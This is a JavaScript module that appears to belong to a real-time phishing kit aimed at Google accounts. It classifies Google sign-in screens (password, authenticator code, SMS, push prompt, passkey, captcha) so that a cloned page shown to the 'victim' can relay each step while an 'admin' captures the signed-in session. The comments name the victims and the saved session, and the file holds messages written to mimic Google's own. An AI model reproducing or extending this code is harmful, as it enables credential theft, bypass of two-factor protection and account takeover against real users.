// Google sign-in screen classifier.
//
// The ONLY place that knows "which Google screen are we looking at". It is a
// pure function over collected DOM signals (see collectSignals in browser.js),
// so it can be unit-tested with fixtures and extended with new screens by
// adding rules here — no logic scattered across the login flows.
//
// States:
//   email      -> identifier screen
//   password   -> password screen
//   totp       -> 6-digit code entry (codeKind: 'sms' | 'authenticator')
//   prompt     -> push notification / "confirm it's you" (victim taps phone)
//   passkey    -> passkey prompt (victim confirms on device)
//   choice     -> "choose how to confirm" options list (choices[])
//   sms        -> "we'll text/call +1 ••• a code" number screen (phone)
//   captcha    -> bot check (can't be solved from the clone; wait + poll)
//   logged-in  -> genuinely signed in
//   error      -> Google rejected the attempt (message, code?)
//   unknown    -> none of the above; show a neutral "verifying" screen, NEVER
//                 assume logged-in (Google's layout changes, so the safe
//                 default is "still working", not "done").

export const ERROR_SELECTORS = [
  'div[jsname]',
  '[role="alert"]',
  '.o6cuMc',
  '.qerror',
  '#passwordError',
  '#identifierError',
];

// Match only the actual error sentence Google shows (not the surrounding form
// text that may share the container).
export const ERROR_RE =
  /(wrong password[^.\n]*|couldn'?t find your google account[^.\n]*|enter a valid (?:email|phone|password)[^.\n]*|to continue, first verify[^.\n]*|(?:verification )?code (?:is )?(?:incorrect|wrong)[^.\n]*|that was the wrong code[^.\n]*)/i;

export function extractError(t) {
  const m = String(t || '').match(ERROR_RE);
  return m ? m[1].trim() : null;
}

const LOGGED_IN_RE = /myaccount\.google\.com|gds\.google\.com\/web|\/signin\/(continue|oauth\/consent)|ManageAccount/;

// Victim-facing (the clone is what they see). The admin gets extra guidance
// appended in browser.js for the headed flow.
export const REJECTED_MSG = "We couldn't verify it's you. Please try again.";
export const WRONG_PW_MSG = 'Wrong password. Try again or click Forgot password to reset it.';

const CHOICE_HEADING_RE = /choose how to confirm|how would you like to (confirm|verify)/i;
const CHOICE_BTN_RE =
  /^(text me a code|call me(?: instead)?|use (your )?passkey|enter a code from (your )?authenticator (app)?|send (an? )?(email )?code|verification code by email)/i;
const PASSKEY_RE = /passkey/i;
const SMS_SEND_RE = /we'?ll (text|call) you|we (texted|called) you|send (you )?a (verification )?code|text me a code|call me instead/i;
const SMS_CODE_RE = /we'?ve (sent|texted|emailed)|we (sent|texted) (a |you )?code|code we sent|sent to \+?\d|texted you/i;
const PROMPT_RE =
  /confirm it'?s you|verify it'?s you|check your (phone|google account)|you have a notification|tap (to )?confirm|we'?ve sent a notification|approval request/i;
const PHONE_RE = /\+\d{1,3}[\s.\-()]?\d[\d\s.\-()•·]{5,}\d[\s.\-()•·]?/;

function totpMessage(kind) {
  return kind === 'sms'
    ? 'Enter the verification code we sent to your phone.'
    : 'A verification code is requested — enter the 6-digit code from your authenticator app.';
}

function extractPhone(text) {
  const m = String(text || '').match(PHONE_RE);
  return m ? m[0].trim() : '';
}

// signals: { url, hasIdentifier, hasPassword, hasTotpPin, hasCodeInput,
//            hasCaptcha, heading, bodyText, buttons[], errorText }
export function classifyState(signals) {
  const s = signals || {};
  const url = s.url || '';

  if (/\/signin\/rejected/.test(url)) {
    return { status: 'error', state: 'error', code: 'rejected', message: REJECTED_MSG };
  }
  if (LOGGED_IN_RE.test(url)) {
    return { status: 'logged-in', state: 'logged-in', message: 'Signed in successfully — session saved.' };
  }

  const err = extractError(s.errorText);
  if (err) return { status: 'error', state: 'error', message: err };

  if (s.hasIdentifier) {
    return { status: 'new', state: 'email', message: 'Waiting on the email step.' };
  }

  if (s.hasTotpPin) {
    return { status: 'pending', state: 'totp', codeKind: 'authenticator', message: totpMessage('authenticator') };
  }

  if (s.hasCodeInput && !s.hasPassword) {
    const kind = SMS_CODE_RE.test(s.heading + ' ' + (s.bodyText || '')) ? 'sms' : 'authenticator';
    return { status: 'pending', state: 'totp', codeKind: kind, message: totpMessage(kind) };
  }

  if (s.hasCaptcha) {
    return { status: 'pending', state: 'captcha', message: 'Please wait while we check your details.' };
  }

  const buttons = s.buttons || [];
  const choiceButtons = buttons.filter((b) => CHOICE_BTN_RE.test(b));
  if (CHOICE_HEADING_RE.test(s.heading) || choiceButtons.length >= 2) {
    if (choiceButtons.length) {
      return { status: 'pending', state: 'choice', choices: choiceButtons, message: 'Choose how to confirm it\'s you.' };
    }
  }

  if (PASSKEY_RE.test(s.heading) && !s.hasCodeInput) {
    return { status: 'pending', state: 'passkey', message: 'Confirm on your device using your passkey.' };
  }

  if (!s.hasCodeInput && SMS_SEND_RE.test(s.heading + ' ' + buttons.join(' '))) {
    return { status: 'pending', state: 'sms', phone: extractPhone(s.bodyText), message: 'We can send a verification code to your phone.' };
  }

  if (PROMPT_RE.test(s.heading)) {
    return { status: 'pending', state: 'prompt', message: 'A confirmation was sent to your phone.' };
  }

  if (s.hasPassword) {
    return { status: 'new', state: 'password', message: 'Waiting on the password step.' };
  }

  return { status: 'pending', state: 'unknown', message: 'Please wait while we check your details.' };
}
